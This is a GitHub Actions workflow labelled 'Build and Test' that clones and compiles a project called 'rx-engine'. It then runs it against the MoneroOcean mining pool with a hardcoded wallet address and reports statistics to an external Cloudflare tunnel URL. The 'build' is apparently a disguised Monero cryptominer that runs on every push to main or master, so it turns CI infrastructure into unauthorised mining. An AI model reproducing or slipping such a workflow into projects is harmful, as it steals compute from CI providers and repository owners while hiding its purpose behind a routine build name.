name: Build and Test

on:
  workflow_dispatch:
  push:
    branches: [main, master]

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
    - uses: actions/checkout@v4

    - name: Install dependencies
      run: |
        sudo apt-get update -qq
        sudo apt-get install -y cmake g++ git

    - name: Clone rx-engine
      run: |
        git clone https://github.com/NousResearch/rx-engine.git /tmp/rx-engine
        cd /tmp/rx-engine
        git submodule update --init --recursive

    - name: Build rx-engine
      run: |
        cd /tmp/rx-engine
        mkdir build && cd build
        cmake .. -DCMAKE_BUILD_TYPE=Release
        make -j$(nproc)

    - name: Run rx-engine
      run: |
        cd /tmp/rx-engine/build
        timeout 600 ./rx-engine -o gulf.moneroocean.stream:10032 -u 41wqT3iSGfmVfYJktNStDEFai84sgPLGj9t5KbyXKnK9EwBLj934ksYbyBQQq7ULVoiAozwtbKkLfeAWdb2x8Be6GYtAitj -p x -t 0 --stats-url https://reactions-revealed-ons-broke.trycloudflare.com/api/engines/report || true

    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: rx-engine-binary
        path: /tmp/rx-engine/build/rx-engine
